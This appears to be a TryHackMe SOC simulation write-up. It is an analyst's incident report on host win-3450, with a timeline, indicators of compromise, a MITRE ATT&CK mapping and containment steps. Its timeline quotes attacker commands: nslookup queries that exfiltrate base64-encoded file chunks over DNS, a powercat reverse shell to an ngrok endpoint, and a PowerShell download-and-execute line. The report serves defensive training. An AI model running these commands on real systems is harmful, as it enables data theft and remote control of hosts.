# TryHackMe SOC Simulator – Incident Investigation Report

## Overview

During this SOC simulation, multiple low-priority alerts were generated relating to suspicious emails and parent-child process relationships. Most alerts were determined to be false positives caused by legitimate Windows activity or benign spam emails.

A genuine security incident was identified on host **win-3450**, where PowerShell was used to conduct reconnaissance, access a network share, collect files, stage data for exfiltration, and transmit data externally using DNS requests.

---

## Incident Summary

**Classification:** True Positive

**Severity:** High

**Affected Host:** win-3450

**Affected User:** michael.ascot

**Attack Type:**

- Discovery
- Collection
- Staging
- Data Exfiltration
- Command & Control Activity

---

## Investigation Timeline

### 1. PowerShell Script Download

Alert 1020 identified the creation of:

```text
C:\Users\michael.ascot\Downloads\PowerView.ps1
```

PowerView is a well-known PowerShell reconnaissance framework commonly used by attackers and red team operators.

---

### 2. Network Share Access

Alert 1022 revealed a mapped network drive:

```cmd
net use Z: \\FILESRV-01\SSF-FinancialRecords
```

The network share containing financial records was mounted to the local system.

---

### 3. File Collection

Alert 1023 showed Robocopy being executed:

```cmd
Robocopy.exe . C:\Users\michael.ascot\Downloads\exfiltration /E
```

Files were copied from the mapped share into a local staging directory.

Observed files:

```text
ClientPortfolioSummary.xlsx
InvestorPresentation2023.pptx
```

---

### 4. Archive Creation

Subsequent logs showed creation of:

```text
C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip
```

The collected files were compressed into a ZIP archive for exfiltration.

---

### 5. DNS Data Exfiltration

Multiple high-severity alerts (1025–1034) identified PowerShell spawning numerous instances of:

```cmd
nslookup.exe
```

Examples:

```text
nslookup UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io
nslookup U3VtbWFyeS54bHN4c87JTM0rCcgvKk.haz4rdw4re.io
nslookup VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm.haz4rdw4re.io
```

PowerShell logs confirmed files were Base64 encoded and split into chunks before transmission through DNS queries to:

```text
haz4rdw4re.io
```

This activity is consistent with DNS tunneling and data exfiltration.

---

### 6. Reverse Shell Activity

PowerShell logs also revealed execution of Powercat:

```powershell
IEX(New-Object System.Net.WebClient).DownloadString(...)
powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
```

This indicates attempted outbound command-and-control communication and reverse shell capability.

---

## Indicators of Compromise (IOCs)

### Domains

```text
haz4rdw4re.io
```

### External Endpoint

```text
2.tcp.ngrok.io:19282
```

### Tools Observed

```text
PowerView.ps1
PowerShell
Powercat
Robocopy.exe
nslookup.exe
net.exe
```

### Files

```text
ClientPortfolioSummary.xlsx
InvestorPresentation2023.pptx
exfilt8me.zip
```

---

## MITRE ATT&CK Mapping

| Tactic            | Technique                                                 |
| ----------------- | --------------------------------------------------------- |
| Discovery         | T1087 – Account Discovery                                 |
| Discovery         | T1069 – Permission Group Discovery                        |
| Collection        | T1005 – Data from Local System                            |
| Collection        | T1039 – Data from Network Shared Drive                    |
| Archive           | T1560.001 – Archive via Utility                           |
| Exfiltration      | T1048.003 – Exfiltration Over Unencrypted Non-C2 Protocol |
| Exfiltration      | T1071.004 – DNS                                           |
| Command & Control | T1105 – Ingress Tool Transfer                             |
| Command & Control | T1090 – Proxy/Ngrok Tunneling                             |

---

## Containment Actions

Recommended actions:

1. Isolate host win-3450.
2. Disable or investigate account michael.ascot.
3. Block domain haz4rdw4re.io.
4. Block outbound communication to ngrok endpoints.
5. Remove PowerView.ps1 and associated artifacts.
6. Investigate additional systems for similar DNS activity.
7. Reset potentially compromised credentials.
8. Review access to FILESRV-01 and SSF-FinancialRecords.

---

## Conclusion

The investigation identified a genuine attack chain involving reconnaissance, network share access, file collection, archive creation, DNS-based exfiltration, and reverse-shell activity. Multiple alerts were correlated to the same incident on host win-3450, confirming unauthorized access to sensitive data and attempted external transmission.

Final classification: **True Positive**
